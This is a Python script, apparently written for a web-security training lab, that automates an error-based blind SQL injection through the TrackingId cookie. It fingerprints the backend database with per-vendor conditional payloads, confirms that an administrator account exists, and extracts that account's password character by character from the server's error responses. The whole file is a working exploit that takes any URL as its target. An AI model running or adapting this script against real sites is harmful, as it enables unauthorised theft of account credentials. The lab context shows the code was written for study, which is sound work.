#!/usr/bin python3

'''
Script created to automate the second lab of the Blind SQL injection lesson.

Usage:
python3 blind2.py -u <url>
or
python3 blind2.py --url <url>
'''

import requests
import argparse

# create a new session which we will use throughout the script to change the value of the cookies
session = requests.session()

# the funtion to parse the url in the terminal
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="Type url")
    options = parser.parse_args()
    if not options.url:
        parser.error("Plese type url (--help for Help)")
    return options

# 1s step - check if an error message is received
def check_err(url):
    # erase the value of the TrackingId cookie
    cookies = session.cookies.set('TrackingId', None)
    # set "'" as the cookie value
    cookies = session.cookies.set('TrackingId', "'")
    # get the status code of the response
    response = session.get(url).status_code
    # convert the status into a string in order to use it in the if conditional
    response = str(response)

    err1 = False
    # if we dont find a 200 OK response in the request then err1 will be True
    if "200" not in response:
        err1 = True
    else:
        print("Using ' does not display an error")
    # same as before
    cookies = session.cookies.set('TrackingId', None)
    cookies = session.cookies.set('TrackingId', '"')
    response = session.get(url).status_code
    response = str(response)
    err2 = False
    # we are instead looking for the 200 OK response now to err2 to be True
    if "200" in response:
        err2 = True
    else:
        print('Using " displays an error')

    if err1 and err2:
        print("\nSQL has a detectable effect on the response.\n")

# 2nd step - find out which database is the application using
def which_db(url):
    # set the database names and the variable database to global variables in order to use them in other functions
    global oracle, microsoft, postgresql, mysql, database
    # add the different conditional testing queries syntax to each database
    oracle = "'+union+select+case+when+(1=2)+then+to_char(9/0)+else+null+end+from+dual--"
    microsoft = "'+union+select+case+when+(1=2)+then+9/0+else+null+end--"
    postgresql = "'+union+select+case+when+(1=2)+then+cast(9/0+as+text)+else+null+end--"
    mysql = "'+union+select+if(1=2,(select+table_name+from+information_schema.tables),'a')--"
    database = ""
    # create a dictionary of all databases in order to use them in the for loop
    d = dict(((k, eval(k)) for k in ('oracle', 'microsoft', 'postgresql', 'mysql')))
    # create a for loop to inject each database's conditinal query in the cookie and send it on a request
    for key in d:
        value = d[key]
        db = key
        cookies = session.cookies.set('TrackingId', None)
        cookies = session.cookies.set('TrackingId', value)
        response = session.get(url).status_code
        response = str(response)
        # Since the conditinal queries evaluate to true, only the right database query will not return an Error
        # when we find that database (with a 200 OK response), add its value to the global variable "database"
        if "200" in response:
            print(f"The apllication uses an {db.title()} database.\n")
            database = value

        else:
            continue

# Verify again the error returned with a true conditinal query for POC
def verify_err(url):

    payload = database.replace("2","1")
    cookies = session.cookies.set('TrackingId', None)
    cookies = session.cookies.set('TrackingId', payload)
    response = session.get(url).status_code
    response = str(response)

    if "200" not in response:
        print("Error received when condition is True\n")
    else:
        print("Error not found")
# Check if there is an administrator user
def verify_admin(url):
    # Since we are searching on the table users, we use the replace method to replace "dual" by "users" in the query
    new = database.replace("dual", "users")
    # Then we use the same method to replace "1=2" to "username='administrator'"
    payload = new.replace("1=2","username='administrator'")
    cookies = session.cookies.set('TrackingId', None)
    cookies = session.cookies.set('TrackingId', payload)
    response = session.get(url).status_code
    response = str(response)
    # If it returns an error, we know that there is an administrator user
    if "200" not in response:
        print("Administrator account found\n")
    else:
        print("Administrator account not found")
# Verify the lenght of the password
def verify_length(url):
    # Set a range of 10 characters to the password
    l = range(1,10)
    new = database.replace("dual", "users")
    payload = new.replace("1=2","username='administrator'+AND+length(password)>1")
    # Create a for loop to iterate the number that will return the lenght of the password
    for num in l:
        inject = payload.replace("1", str(num))
        cookies = session.cookies.set('TrackingId', None)
        cookies = session.cookies.set('TrackingId', inject)
        response = session.get(url).status_code
        response = str(response)
        # Once the request returns a 200 OK response, it means that the conditinal is false and we found the pass length
        if "200" in response:
            print(f"Password has {num} characters")
            break
# find the password
def verify_passwd(url):
    new = database.replace("dual", "users")
    payload = new.replace("1=2","username='administrator'+AND+substr(password,§1§,1)='§a§'")
    lenght = range(1,7)
    char = "abcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
    passwd = []
    # Iterate through all 6 characters and add them to the password variable depending on the response
    for num in lenght:
        for c in char:
            p1 = payload.replace("§1§", str(num))
            p2 = p1.replace("§a§", c)
            cookies = session.cookies.set('TrackingId', None)
            cookies = session.cookies.set('TrackingId', p2)
            response = session.get(url).status_code
            response = str(response)
            # Here I just realised that I could just use the 500 status code in the response to indetify the Error
            # Every time it returns an error it means the conditional is true so we have our characters
            if "500" in response:
                passwd.append(c)
                break

    passwd = "".join(passwd)
    print(passwd)

options = get_arguments()
check_err(options.url)
which_db(options.url)
verify_err(options.url)
verify_admin(options.url)
verify_length(options.url)
verify_passwd(options.url)
